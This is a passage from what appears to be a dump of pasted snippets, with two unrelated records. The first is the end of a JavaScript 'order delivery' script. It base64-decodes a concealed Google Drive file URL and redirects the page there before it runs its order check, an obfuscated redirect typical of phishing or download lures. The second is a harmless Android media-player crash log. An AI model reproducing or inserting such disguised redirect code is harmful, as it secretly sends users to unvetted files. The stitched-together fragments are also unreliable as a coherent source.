        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4ckfijma,2025-04-28T21:00:08.284294,powerampache,PHP,Monday 28th of April 2025 02:00:08 PM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":33},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":2087841654,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
